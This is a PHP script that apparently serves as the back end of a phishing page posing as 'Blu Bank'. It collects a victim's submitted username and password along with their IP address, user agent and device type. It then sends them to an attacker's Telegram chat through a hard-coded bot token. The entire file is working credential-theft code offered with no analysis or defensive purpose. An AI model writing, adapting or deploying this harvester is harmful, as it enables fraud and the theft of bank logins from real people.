<?php

if($_POST['user'] == ""){
    header('Location: ../');
    exit();
}

$token = "6789334367:AAHp_YSNShci064rvLfC5Ap5HJNBVaNjUco";
$id = 5403131968;

$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$iso = $_SERVER['HTTP_USER_AGENT'];
$ip_info = json_decode(file_get_contents("http://ipwho.is/" . $ip), true);
$model = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT'])[2], ")");
if ($model === "NT") {
  $model = "Desktop";
} else if ($model === "CPU") {
  $model = "IOS";
}
$Text = "
<b>Blu Bank | User Info</b>
<b>UserAgent : </b><code>$iso</code>
<b>Ip : </b><code>$ip</code>
<b>Username : </b><code>$user</code>
<b>Password : </b><code>$pass</code>

device : <code>$model</code>
app : <code>blu-app</code>
";

@file_get_contents("https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$id&text=" . urlencode($Text));

?>